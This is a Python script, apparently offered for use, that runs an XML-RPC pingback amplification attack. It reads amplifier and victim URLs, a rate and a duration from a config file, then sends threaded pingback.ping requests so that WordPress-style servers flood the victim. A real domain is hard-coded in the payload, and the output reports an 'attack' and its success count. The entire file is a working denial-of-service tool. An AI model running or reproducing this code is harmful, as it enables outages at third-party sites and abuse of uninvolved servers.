#!/usr/bin/env python3
"""
Shadow Core - XML-RPC Pingback Amplifier
"""
import requests
import time
import json
import sys
import concurrent.futures
from datetime import datetime

# تحميل الإعدادات
with open("config.json", "r") as f:
    config = json.load(f)

AMPLIFIER = config["amplifier_url"]
VICTIM = config["victim_url"]
RPM = config["requests_per_minute"]
DURATION = config["duration_minutes"]
THREADS = config.get("threads", 5)

def build_pingback_xml(target):
    return f"""<?xml version="1.0" encoding="utf-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>{target}</string></value></param>
<param><value><string>https://physiqueacademy.net</string></value></param>
</params>
</methodCall>"""

def send_pingback():
    try:
        xml = build_pingback_xml(VICTIM)
        r = requests.post(
            AMPLIFIER,
            data=xml,
            headers={"Content-Type": "text/xml"},
            timeout=5
        )
        return r.status_code
    except:
        return 0

def main():
    print(f"[*] GitHub Amplifier Started @ {datetime.now()}")
    print(f"[*] Amplifier: {AMPLIFIER}")
    print(f"[*] Victim: {VICTIM}")
    print(f"[*] Rate: {RPM} req/min | Duration: {DURATION} min | Threads: {THREADS}")

    delay = 60.0 / RPM
    total_requests = RPM * DURATION
    success = 0
    fail = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        for i in range(total_requests):
            futures.append(executor.submit(send_pingback))
            if (i + 1) % 50 == 0:
                print(f"[*] Progress: {i+1}/{total_requests}")
            time.sleep(delay / THREADS)

        for future in concurrent.futures.as_completed(futures):
            if future.result() == 200:
                success += 1
            else:
                fail += 1

    print(f"\n[*] Attack finished @ {datetime.now()}")
    print(f"[*] Success: {success} | Failed: {fail}")

if __name__ == "__main__":
    main()
